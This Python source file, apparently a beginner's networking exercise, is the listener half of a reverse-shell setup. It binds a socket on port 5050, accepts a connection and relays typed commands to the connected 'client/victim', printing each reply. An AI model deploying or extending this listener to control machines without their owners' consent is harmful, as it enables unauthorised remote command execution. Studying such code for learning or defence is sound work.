##############################
##### PYTHON NETWORKING ######
##############################

import socket
import sys 

def create_socket():
    try:
        
        global host
        global port 
        global s
        host = ""
        port = 5050 # not use it
        s = socket.socket()
    except socket.error as msg:
        print("socket error" + str(msg))
#########################################
# binding the socket with listening and connection

# is it enough to connect computer with socket? NO
# Why do need bindto a host & port with socket?
# i might be able to open line of communication with socket,
# but it's really need to know about info about computer or device
# it is supposed to communicating with


def bind_socket():
    
        global a
        global host
        global port 
        global s
        
        print("Binding the port   " + str(port))
      

        s.bind((host,port))
        s.listen()

    # except socket.error as msg:
    #     print("socket binding error"+ str(msg)+"\n"+"retrying...")
    #     bind_socket()

################################

# Established connection with client(socket must be listening)
#accept connection
def socket_accept():
    conn, addr = s.accept() #(object of connection,list Ip to a port)
    print("connectin has been established  "+ " | IP | "+ addr[0]+" | port | "+str(addr[1]))
    send_command(conn) # here conn for conversation
    #conn.close()
#############################################

# Send command to client/victim or friend

def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit() # to close command prompt
        if len(str.encode(cmd)) >0:
            
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")
###############################################

if __name__ == '__main__' :
    create_socket()
    bind_socket()
    socket_accept()
